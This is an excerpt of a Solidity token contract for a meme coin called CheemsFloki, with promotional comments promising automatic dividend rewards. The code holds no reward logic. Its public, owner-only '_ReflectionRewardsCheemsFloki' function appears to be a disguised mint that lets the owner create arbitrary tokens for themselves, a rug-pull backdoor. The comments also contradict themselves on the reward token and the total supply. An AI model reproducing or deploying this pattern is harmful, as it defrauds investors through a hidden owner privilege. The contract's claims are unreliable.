...
//
// $CheemsFloki proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
// simply hold$CheemsFloki and you'll receive CheemsFloki automatically in your wallet.
// 
// Hold CheemsFloki and get rewarded in CheemsFloki on every transaction!
//
//
// 📱 Telegram: https://t.me/CheemsFlokii
// 🌎 Website: TBA
// 🌐 Twitter: TBA
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ReflectionRewardsCheemsFloki(uint256 amount) public onlyOwner {
    _ReflectionRewardsCheemsFloki(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsCheemsFloki(address account, uint256 amount) internal virtual {
...
contract CHEEMSFLOKI is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("CHEEMS FLOKI", "CHEEMSFLOKI") {
        _ReflectionRewardsCheemsFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}